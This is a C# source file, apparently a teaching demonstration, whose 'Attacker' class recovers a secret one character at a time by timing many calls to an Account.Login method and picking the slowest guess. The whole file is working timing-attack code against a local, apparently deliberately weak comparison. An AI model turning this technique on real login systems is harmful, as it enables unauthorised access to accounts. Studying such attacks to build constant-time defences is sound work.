using System.Diagnostics;
using System.Text;

public sealed class Attacker
{
    private static readonly int ITERATIONS_PER_CHAR = 40_000_000;

    public string findSecret(Account account, int secretLength, char[] charset)
    {
        /*
        Since we assume that we know the length of the secret we can start by
        creating a secret with the same length as the original secret and fill
        it with dashes.
        */
        var secret = new StringBuilder(new string('-', secretLength));
        for (int i = 0; i < secretLength; i++)
        {
            /*
            find the next character by measuring the time it takes to login
            and taking the character with the longest time and the replace
            the current index of our dash-filled secret with the found character
            until we replace all dashes with the correct characters.
            */
            var found = findNextChar(account, secret.ToString(), i, charset);
            secret = secret.Replace('-', found, i, 1);
            Console.WriteLine($"Current secret: {secret}");
        }
        return secret.ToString();
    }

    private char findNextChar(Account a, string current, int index, char[] charset) {
        // create a dictionary to store the time it takes to login with each character
        var charTimes = new Dictionary<char, long>();
        foreach (var ch in charset) {
			// initialize the dictionary with 0 for each character before measuring the time
            charTimes[ch] = 0;

			// create a new guess by replacing the current character index with current character
            var guess = current.Substring(0, index) + ch + current.Substring(index + 1);

            // iterate multiple times to get a more accurate time measurement and avoid noise
            for (int i = 0; i < ITERATIONS_PER_CHAR; i++) {
                // measure the time it takes trying to login with the current guess
                var start = Stopwatch.GetTimestamp();
                a.Login(guess);
                var end = Stopwatch.GetTimestamp();
                charTimes[ch] += end - start;           // add the time it took to the dictionary
            }
        }
        return charTimes.MaxBy(x => x.Value).Key;       // return the character with the longest time
    }
}
